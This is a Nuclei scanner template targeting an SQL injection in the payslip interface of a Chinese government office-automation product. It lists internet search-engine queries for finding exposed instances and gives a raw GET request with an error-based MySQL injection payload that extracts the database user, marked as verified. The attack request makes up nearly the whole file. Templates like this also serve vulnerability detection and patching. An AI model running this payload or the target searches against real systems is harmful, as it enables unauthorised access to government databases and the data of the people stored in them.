id: Sztbj_gov_OA_PayslipUser_SQLi

info:
  name: Sztbj_gov_OA_PayslipUser_SQLi
  author: HK
  severity: high
  description: 数字通OA-智慧政务接口payslip存在SQL注入漏洞
  metadata:
    max-request: 1
    Fofa-query: body="/mobile/default/sendsmscode"
    Quake-query: body="/mobile/default/sendsmscode"
    Hunter-query: body="/mobile/default/sendsmscode"
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /payslip/search/index/userid/time/time?PayslipUser[user_id]=(SELECT 4050 FROM(SELECT COUNT(*),CONCAT((mid((ifnull(cast(current_user() as nchar),0x20)),1,54)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Cookie: GOASESSID=i589f58naalabocmbidup7edl3
    Upgrade-Insecure-Requests: 1


  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
      - SQL